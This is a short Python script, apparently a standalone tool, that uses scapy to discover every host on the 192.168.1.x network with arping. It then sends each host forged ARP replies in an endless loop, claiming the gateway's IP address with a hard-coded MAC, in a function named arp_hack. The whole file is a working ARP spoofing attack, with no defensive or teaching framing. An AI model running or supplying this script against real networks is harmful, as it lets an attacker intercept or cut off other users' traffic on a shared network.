# -*-coding:utf-8 -*-


import time
import sys
import re

from scapy.all import ARP, send, arping


stdout = sys.stdout
IPADDR = "192.168.1.*"

GATEWAY_IP = "192.168.1.1"
GATEWAY_MAC = "00:12:33:34:45:99"

SPEED = 2


def arp_hack(mac, ip):
    p = ARP(op=2, hwsrc=GATEWAY_MAC, psrc=GATEWAY_IP)
    p.hwdst = mac
    p.pdst = ip
    send(p)


def get_host():
    mac_ip = {}

    sys.stdout = open('host.info', 'w')
    arping(IPADDR)
    sys.stdout = stdout

    f = open('host.info', 'r')
    info = f.readlines()
    f.close()

    for host in info:
        tmp = re.split(r'\s+', host)
        if len(tmp) != 4:
            continue

        mac_ip[tmp[1]] = tmp[2]

    return mac_ip


if __name__ == "__main__":
    mac_ip = get_host()

    while True:
        for k_mac, v_ip in mac_ip.items():
            arp_hack(mac=k_mac, ip=v_ip)
            time.sleep(SPEED)
